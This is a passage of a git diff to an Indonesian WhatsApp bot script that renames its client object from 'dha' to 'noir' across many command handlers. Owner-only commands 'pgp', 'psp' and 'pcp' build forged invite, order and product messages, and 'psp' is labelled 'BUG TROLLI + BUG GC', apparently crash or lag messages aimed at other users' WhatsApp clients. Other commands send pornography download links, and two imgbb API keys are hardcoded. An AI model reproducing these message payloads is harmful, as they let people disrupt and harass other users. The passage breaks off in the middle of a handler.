+                                                 noir.sendMessage(from, 'Terjadi kesalahan', 'conversation', {
                                                         quoted: mek
                                                  })
                                                  fs.unlinkSync(media)
@@ -3809,7 +3564,7 @@ Source : ${anu.result.source}
                                                  _out = getRandom('.webp')
                                                  spawn('webpmux', ['-set', 'exif', './sticker/data.exif', out, '-o', _out])
                                                         .on('exit', () => {
-                                                               dha.sendMessage(from, fs.readFileSync(_out), 'stickerMessage', {
+                                                               noir.sendMessage(from, fs.readFileSync(_out), 'stickerMessage', {
                                                                       quoted: mek
                                                                })
                                                                fs.unlinkSync(out)
@@ -3828,13 +3583,13 @@ Source : ${anu.result.source}
                             if (!isQuotedSticker) return reply('reply stickernya')
                             reply(mess.wait)
                             encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
-                            media = await dha.downloadAndSaveMediaMessage(encmedia)
+                            media = await noir.downloadAndSaveMediaMessage(encmedia)
                             ran = getRandom('.png')
                             exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                                    fs.unlinkSync(media)
                                    if (err) return reply('Gagal, pada saat mengkonversi sticker ke gambar')
                                    buffer = fs.readFileSync(ran)
-                                   dha.sendMessage(from, buffer, image, {
+                                   noir.sendMessage(from, buffer, image, {
                                           quoted: mek,
                                           caption: 'Nih'
                                    })
@@ -3848,7 +3603,7 @@ Source : ${anu.result.source}
                             var imgbb = require('imgbb-uploader')
                             if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length > 0) {
                                    ger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
-                                   owgi = await dha.downloadAndSaveMediaMessage(ger)
+                                   owgi = await noir.downloadAndSaveMediaMessage(ger)
                                    anu = await imgbb("cedeb44b8d204947a6833ca1412ca77d", owgi)
                                    teks = `${anu.display_url}`
                                    ranp = getRandom('.gif')
@@ -3868,7 +3623,7 @@ Source : ${anu.result.source}
                             if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length > 0) {
                                    reply(mess.wait)
                                    ger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
-                                   owgi = await dha.downloadAndSaveMediaMessage(ger)
+                                   owgi = await noir.downloadAndSaveMediaMessage(ger)
                                    anu = await imgbb("39d895963468b814fad0514bd28787e2", owgi)
                                    teks = `${anu.display_url}`
                                    ranp = getRandom('.gif')
@@ -3883,10 +3638,10 @@ Source : ${anu.result.source}
                             if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
                                    reply(mess.wait)
                                    encmediaaa = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
-                                   mediaaa = await dha.downloadAndSaveMediaMessage(encmediaaa)
+                                   mediaaa = await noir.downloadAndSaveMediaMessage(encmediaaa)
                                    a = await webp2gifFile(mediaaa)
                                    mp4 = await getBuffer(a.result)
-                                   dha.sendMessage(from, mp4, video, {
+                                   noir.sendMessage(from, mp4, video, {
                                           mimetype: 'video/gif',
                                           quoted: mek,
                                           caption: mess.success
@@ -3900,10 +3655,10 @@ Source : ${anu.result.source}
                             if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
                                    reply(mess.wait)
                                    encmediaaa = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
-                                   mediaaa = await dha.downloadAndSaveMediaMessage(encmediaaa)
+                                   mediaaa = await noir.downloadAndSaveMediaMessage(encmediaaa)
                                    a = await webp2gifFile(mediaaa)
                                    mp4 = await getBuffer(a.result)
-                                   dha.sendMessage(from, mp4, video, {
+                                   noir.sendMessage(from, mp4, video, {
                                           mimetype: 'video/mp4',
                                           quoted: mek,
                                           caption: mess.success
@@ -3917,13 +3672,13 @@ Source : ${anu.result.source}
                             if (isQuotedVideo || isQuotedAudio) {
                                    reply(mess.wait)
                                    encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
-                                   media = await dha.downloadAndSaveMediaMessage(encmedia)
+                                   media = await noir.downloadAndSaveMediaMessage(encmedia)
                                    ran = getRandom('.mp3')
                                    exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                                           fs.unlinkSync(media)
                                           if (err) return reply(`Err: ${err}`)
                                           buffer453 = fs.readFileSync(ran)
-                                          dha.sendMessage(from, buffer453, audio, {
+                                          noir.sendMessage(from, buffer453, audio, {
                                                  mimetype: 'audio/mp4',
                                                  quoted: mek
                                           })
@@ -3938,9 +3693,9 @@ Source : ${anu.result.source}
                             bokep = body.slice(1)
                             const bo = ['https://www.mediafire.com/download/8hnhjcf3pseubgy', 'https://www.mediafire.com/download/cty9phda3d1s62u', 'https://www.mediafire.com/download/8hnhjcf3pseubgy']
                             const kep = bo[Math.floor(Math.random() * bo.length)]
-                            dha.sendMessage(from, '*PERMINTAAN:* ' + bokep + '\n*DOSA TANGGUNG PRIBADI*\n*NI BRO FREE BUAT KAMU DOWNLOAD SENDIRI:* ' + kep, text, {
+                            noir.sendMessage(from, '*PERMINTAAN:* ' + bokep + '\n*DOSA TANGGUNG PRIBADI*\n*NI BRO FREE BUAT KAMU DOWNLOAD SENDIRI:* ' + kep, text, {
                                    quoted: ftoko,
-                                   caption: `NI BOKEP SAYA DAPAT DARI *©hzkyx* DOSA TANGGUNG SENDIRI🗿`
+                                   caption: `NI BOKEP SAYA DAPAT DARI *©noir* DOSA TANGGUNG SENDIRI🗿`
                             })
                             break
                      case 'xnxx':
@@ -3963,7 +3718,7 @@ Source : ${anu.result.source}
                                    ini_txt += `${x.type} - ${x.link}\n\n`
                             }
                             thumbnail = await getBuffer(get_result.thumbnail)
-                            dha.sendMessage(from, thumbnail, image, {
+                            noir.sendMessage(from, thumbnail, image, {
                                    quoted: mek,
                                    caption: ini_txt
                             })
@@ -3985,27 +3740,27 @@ Source : ${anu.result.source}
                             reply(ini_txt)
                             break
                      case 'asupan1':
-                            dha.updatePresence(from, Presence.composing)
+                            noir.updatePresence(from, Presence.composing)
                             reply(mess.wait)
                             data = fs.readFileSync('./lib/asupan.js');
                             jsonData = JSON.parse(data);
                             randIndex = Math.floor(Math.random() * jsonData.length);
                             randKey = jsonData[randIndex];
                             asupan = await getBuffer(randKey.result)
-                            dha.sendMessage(from, asupan, video, {
+                            noir.sendMessage(from, asupan, video, {
                                    quoted: mek,
                                    caption: '```ASUPAN NIH:V```'
                             })
                             break
                      case 'asupan2':
-                            dha.updatePresence(from, Presence.composing)
+                            noir.updatePresence(from, Presence.composing)
                             reply(mess.wait)
                             data = fs.readFileSync('./lib/asupan2.js');
                             jsonData = JSON.parse(data);
                             randIndex = Math.floor(Math.random() * jsonData.length);
                             randKey = jsonData[randIndex];
                             asupan = await getBuffer(randKey.result)
-                            dha.sendMessage(from, asupan, video, {
+                            noir.sendMessage(from, asupan, video, {
                                    quoted: mek,
                                    caption: '```ASUPAN NIH:V```'
                             })
@@ -4014,7 +3769,7 @@ Source : ${anu.result.source}
                      case 'pvp':
                             if (!mek.key.fromMe && !isOwner) return
                             tapib1 = fs.readFileSync('./media/audio/numayei.mp3')
-                            dha.sendMessage(from, tapib1, document, {
+                            noir.sendMessage(from, tapib1, document, {
                                    quoted: mek,
                                    filename: `NOIR BOT ~ 404 ${vipi}.mp3`,
                                    mimetype: 'audio/application'
@@ -4024,9 +3779,9 @@ Source : ${anu.result.source}
                      case 'pgp':
                             if (!isOwner && !mek.key.fromMe) return
                             buf = Mfake
-                            imeu = await dha.prepareMessage('0@s.whatsapp.net', buf, image)
+                            imeu = await noir.prepareMessage('0@s.whatsapp.net', buf, image)
                             imeg = imeu.message.imageMessage
-                            res = await dha.prepareMessageFromContent(from, {
+                            res = await noir.prepareMessageFromContent(from, {
                                    "groupInviteMessage": {
                                           "groupJid": "85296556573-1328272333@g.us",
                                           "inviteCode": "wFHwtOxGQN8OwK2x",
@@ -4051,9 +3806,9 @@ Source : ${anu.result.source}
                      case 'psp': // BUG TROLLI + BUG GC + TROLLI
                             if (!mek.key.fromMe && !isOwner) return
                             buf = Mfake
-                            imeu = await dha.prepareMessage('0@s.whatsapp.net', buf, image)
+                            imeu = await noir.prepareMessage('0@s.whatsapp.net', buf, image)
                             imeg = imeu.message.imageMessage
-                            res = await dha.prepareMessageFromContent(from, {
+                            res = await noir.prepareMessageFromContent(from, {
                                    "orderMessage": {
                                           "orderId": "150453297177375",
                                           "thumbnail": "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",
@@ -4076,11 +3831,11 @@ Source : ${anu.result.source}
                                    contextInfo: {}
                             })
 
-                            dha.toggleDisappearingMessages(from, 'Awoakwoakwoak')
-                            dha.relayWAMessage(res)
+                            noir.toggleDisappearingMessages(from, 'Awoakwoakwoak')
+                            noir.relayWAMessage(res)
                             break
                      case 'plp':
-                            res = await dha.prepareMessageFromContent(from, {
+                            res = await noir.prepareMessageFromContent(from, {
                                    "listMessage": {
                                           "title": `\`\`\`Hi ${pushname} 👋.\`\`\``,
                                           "description": `\`\`\`Use The Bot As Best You Can And Dont Misuse The Bot Feature\`\`\``,
@@ -4097,14 +3852,14 @@ Source : ${anu.result.source}
                             }, {
                                    quoted: mek
                             })
-                            dha.relayWAMessage(res)
+                            noir.relayWAMessage(res)
                             break
                      case 'pcp':
                             if (!mek.key.fromMe && !isOwner) return
                             buf = Mfake
-                            imeu = await dha.prepareMessage('0@s.whatsapp.net', buf, image)
+                            imeu = await noir.prepareMessage('0@s.whatsapp.net', buf, image)
                             imeg = imeu.message.imageMessage
-                            res = await dha.prepareMessageFromContent(from, {
+                            res = await noir.prepareMessageFromContent(from, {
                                    "productMessage": {
                                           "product": {
                                                  "productImage": imeg,
@@ -4126,15 +3881,15 @@ Source : ${anu.result.source}
                                    contextInfo: {}
                             })
 
-                            dha.relayWAMessage(res)
+                            noir.relayWAMessage(res)
                             break
                             // Bug Trolli ( NOIR BOT )
                      case 'psp': // BUG TROLLI + BUG GC + TROLLI
                             if (!mek.key.fromMe && !isOwner) return
                             buf = Mfake
-                            imeu = await dha.prepareMessage('0@s.whatsapp.net', buf, image)
+                            imeu = await noir.prepareMessage('0@s.whatsapp.net', buf, image)
                             imeg = imeu.message.imageMessage
-                            res = await dha.prepareMessageFromContent(from, {
+                            res = await noir.prepareMessageFromContent(from, {
                                    "orderMessage": {
                                           "orderId": "150453297177375",
